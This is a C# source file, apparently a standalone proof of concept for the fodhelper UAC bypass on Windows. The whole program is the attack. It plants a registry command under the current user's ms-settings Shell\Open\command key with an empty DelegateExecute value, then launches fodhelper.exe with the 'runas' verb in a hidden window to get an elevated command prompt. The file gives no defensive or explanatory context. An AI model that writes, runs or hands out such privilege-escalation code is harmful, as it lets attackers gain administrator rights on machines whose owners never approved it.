using System;
using System.Runtime.InteropServices;

class Program
{
    static void Main()
    {
        IntPtr registryKeyHandle;
        uint registryDisposition;

        string registrySubKey = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
        string registryCommandValue = "cmd /c start C:\\Windows\\System32\\cmd.exe";
        string delegateExecuteValue = "";

        int createKeyStatus = (int)Registry.RegCreateKeyEx(Registry.HKEY_CURRENT_USER, registrySubKey, 0, null, 0, Registry.KEY_WRITE, IntPtr.Zero, out registryKeyHandle, out registryDisposition);
        Console.WriteLine(createKeyStatus != 0 ? "Failed to create reg key" : "Successfully created reg key");

        int commandValueStatus = (int)Registry.RegSetValueEx(registryKeyHandle, "", 0, Registry.REG_SZ, registryCommandValue, (uint)registryCommandValue.Length);
        Console.WriteLine(commandValueStatus != 0 ? "Failed to set reg value" : "Successfully set reg value");

        int delegateValueStatus = (int)Registry.RegSetValueEx(registryKeyHandle, "DelegateExecute", 0, Registry.REG_SZ, delegateExecuteValue, (uint)delegateExecuteValue.Length);
        Console.WriteLine(delegateValueStatus != 0 ? "Failed to set reg value: DelegateExecute" : "Successfully set reg value: DelegateExecute");

        Registry.RegCloseKey(registryKeyHandle);

        ShellExecuteInfo sei = new ShellExecuteInfo();
        sei.cbSize = (uint)Marshal.SizeOf(sei);
        sei.lpVerb = "runas";
        sei.lpFile = "C:\\Windows\\WinSxS\\amd64_microsoft-windows-fodhelper-ux_31bf3856ad364e35_10.0.22621.1635_none_12c2157cebf43fce\\fodhelper.exe";
        sei.hwnd = IntPtr.Zero;
        sei.nShow = SW_HIDE; // Hide the window

        if (!ShellExecuteEx(ref sei))
        {
            uint err = GetLastError();
            Console.WriteLine(err == ERROR_CANCELLED ? "The user refused to allow privilege elevation." : $"Unexpected error! Error code: {err}");
        }
        else
        {
            Console.WriteLine("Successfully created process");
        }
    }

    const int SW_HIDE = 0;
    const int ERROR_CANCELLED = 1223;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct ShellExecuteInfo
    {
        public uint cbSize;
        public uint fMask;
        public IntPtr hwnd;
        public string lpVerb;
        public string lpFile;
        public string lpParameters;
        public string lpDirectory;
        public int nShow;
        public IntPtr hInstApp;
        public IntPtr lpIDList;
        public string lpClass;
        public IntPtr hkeyClass;
        public uint dwHotKey;
        public IntPtr hIcon;
        public IntPtr hProcess;
    }

    public class Registry
    {
        public const int HKEY_CURRENT_USER = unchecked((int)0x80000001);
        public const uint KEY_WRITE = 0x00020006;
        public const uint REG_SZ = 1;

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern int RegCreateKeyEx(
            int hKey,
            string subKey,
            uint reserved,
            string lpClass,
            uint options,
            uint samDesired,
            IntPtr lpSecurityAttributes,
            out IntPtr phkResult,
            out uint lpdwDisposition
        );

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern int RegSetValueEx(
            IntPtr hKey,
            string lpValueName,
            uint reserved,
            uint dwType,
            string lpData,
            uint cbData
        );

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern int RegCloseKey(IntPtr hKey);
    }

    [DllImport("shell32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ShellExecuteEx(ref ShellExecuteInfo lpExecInfo);

    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();
}
